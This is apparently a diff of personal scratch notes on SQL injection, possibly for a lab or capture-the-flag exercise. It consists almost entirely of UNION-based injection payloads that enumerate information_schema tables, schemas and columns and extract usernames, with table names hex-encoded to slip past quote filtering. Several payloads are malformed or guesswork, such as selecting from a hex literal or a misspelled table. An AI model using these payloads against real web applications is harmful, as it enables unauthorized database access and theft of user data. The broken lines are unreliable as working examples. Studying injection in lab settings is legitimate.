@@ -1,6 +1,37 @@
  we can see all the tables in the database with this query : 
- 	1 UNION SELECT table_schema, table_name FROM information_schema.tables;
+ 	1 UNION SELECT table_schema, table_name FROM information_schema.table WHERE table_name = 0x7573657273;
 
 
- 	1 UNION SELECT * FROM information_schema.tables WHERE table_name = users;
+ 	1 UNION  SELECT username,null FROM (SELECT table_schema, table_name FROM information_schema.tables WHERE table_name = 0x7573657273)t1;
 
+ 	1 UNION SELECT * FROM information_schema.columns;
+
+
+ 	1 UNION SELECT s.schema_name, t.table_name FROM INFORMATION_SCHEMA.schemata AS s LEFT JOIN INFORMATION_SCHEMA.tables AS t ON t.table_schema = s.schema_name
+
+
+
+ 	list_image = 0x6c6973745f696d61676573
+
+ 	users = 0x7573657273
+
+
+
+
+
+1 UNION SELECT table_schema, table_name FROM information_schema.tables WHERE table_name = 0x7573657273;
+
+1 UNION SELECT * FROM information_schema.tables WHERE table_name = 0x7573657273
+
+1 UNION SELECT null, null FROM 0x7573657273
+
+1 UNION SELECT null ,CONCAT(0x53454c454354202a2046524f4d20,table_name) AS my_table FROM information_schema.tables WHERE table_name = 0x7573657273
+
+
+
+
+1
+
+
+
+SELECT * FROM (VALUES (1)) AS s(n) LEFT JOIN (SELECT TOP 1 * FROM dbo.tab1 ) AS sub1 ON 1=1 LEFT JOIN (SELECT TOP 1 * FROM dbo.tab2 )AS sub2 ON 1=1 LEFT JOIN (SELECT TOP 1 * FROM dbo.tabC ) AS sub3 ON 1=1
